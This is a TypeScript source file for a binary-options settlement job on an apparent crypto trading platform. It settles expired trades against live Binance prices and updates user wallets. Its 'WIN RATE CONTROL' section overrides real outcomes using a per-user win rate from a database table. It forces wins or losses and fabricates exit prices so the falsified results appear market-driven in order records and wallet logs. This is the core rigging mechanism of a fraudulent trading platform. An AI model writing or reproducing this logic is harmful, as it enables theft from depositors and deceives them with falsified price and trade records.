import { db } from "@/lib/db";

export async function settleOptions() {
  const now = new Date().toISOString();

  const { rows: orders } = await db.query(
    `SELECT o.*, uwr.win_rate as custom_win_rate
     FROM options o
     LEFT JOIN user_win_rates uwr ON o.user_id = uwr.user_id
     WHERE o.status = 'open'
     AND o.expires_at <= $1`,
    [now]
  );

  if (!orders.length) return;

  for (const o of orders) {
    try {
      /* 🔒 LOCK */
      const lock = await db.query(
        `UPDATE options
         SET status = 'settling'
         WHERE id = $1 AND status = 'open'
         RETURNING *`,
        [o.id]
      );

      if (lock.rowCount === 0) continue;

      /* 📈 PRICE - FETCH LIVE */
      let exitPrice = 0;
      try {
        const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${o.symbol}USDT`);
        const data = await res.json();
        exitPrice = Number(data.price);

        // Update cache for other uses
        await db.query(`
            INSERT INTO price_cache (symbol, price, updated_at)
            VALUES ($1, $2, now())
            ON CONFLICT (symbol) DO UPDATE SET price = $2, updated_at = now()
        `, [o.symbol, exitPrice]);

      } catch (e) {
         // Fallback to cache if API fails
         const priceRes = await db.query(
            `SELECT price FROM price_cache WHERE symbol = $1`,
            [o.symbol]
         );
         exitPrice = Number(priceRes.rows[0]?.price || 0);
      }

      let isWin =
        (o.direction === "up" || o.direction === "buy")
          ? exitPrice > Number(o.entry_price)
          : exitPrice < Number(o.entry_price);

      // 🎲 WIN RATE CONTROL
      // Check if custom_win_rate is configured for this user in user_win_rates table
      if (o.custom_win_rate !== null && o.custom_win_rate !== undefined) {
        const userWinRate = Number(o.custom_win_rate);
        const roll = Math.random() * 100;
        const entryPriceNum = Number(o.entry_price);
        const variance = entryPriceNum * (0.0005 + Math.random() * 0.0005);

        // roll < userWinRate -> SHOULD WIN (e.g. win_rate = 0% -> 0% chance of win, 100% loss)
        const shouldWin = roll < userWinRate;

        if (shouldWin && !isWin) {
          // FORCE WIN
          isWin = true;
          if (o.direction === "up" || o.direction === "buy") {
            exitPrice = Math.max(exitPrice, entryPriceNum + variance);
          } else {
            exitPrice = Math.min(exitPrice, entryPriceNum - variance);
          }
        } else if (!shouldWin && isWin) {
          // FORCE LOSE
          isWin = false;
          if (o.direction === "up" || o.direction === "buy") {
            exitPrice = Math.min(exitPrice, entryPriceNum - variance);
          } else {
            exitPrice = Math.max(exitPrice, entryPriceNum + variance);
          }
        }
      }

      const payout = (Number(o.payout_percent) || 85) / 100;
      const orderAmount = Number(o.amount);

      // Binary Options Profit/Loss Calculation:
      // WIN: +Payout% of amount (e.g. +85 USDT if stake is 100)
      // LOSE: -100% of amount (e.g. -100 USDT)
      const profit = isWin
        ? orderAmount * payout
        : -orderAmount;

      /* 📝 UPDATE OPTION */
      await db.query(
        `UPDATE options
         SET status = $1,
             exit_price = $2,
             profit = $3,
             closed_at = now()
         WHERE id = $4`,
        [isWin ? "win" : "lose", exitPrice, profit, o.id]
      );

      /* 💰 WALLET REFUND / PAYOUT */
      const creditAmount = isWin ? orderAmount + profit : 0;

      const walletRes = await db.query(
        `UPDATE wallets
         SET balance = balance + $1,
             frozen_balance = frozen_balance - $2,
             updated_at = now()
         WHERE user_id = $3 AND coin = 'USDT' AND wallet_type = 'trading'
         RETURNING balance, id`,
        [creditAmount, orderAmount, o.user_id]
      );

      const newBalance = walletRes.rows[0]?.balance;

      /* 📜 WALLET LOG */
      await db.query(
        `INSERT INTO wallet_logs
         (id, user_id, coin, change, balance_before, balance_after, type, reference_id, created_at)
         VALUES (gen_random_uuid(),$1,'USDT',$2,$3,$4,'option',$5,now())`,
        [
          o.user_id,
          profit,
          newBalance ? Number(newBalance) - profit : 0,
          newBalance ? Number(newBalance) : 0,
          o.id,
        ]
      );

    } catch (err) {
      console.error(`❌ Settle error [${o.id}]:`, err);
    }
  }
}
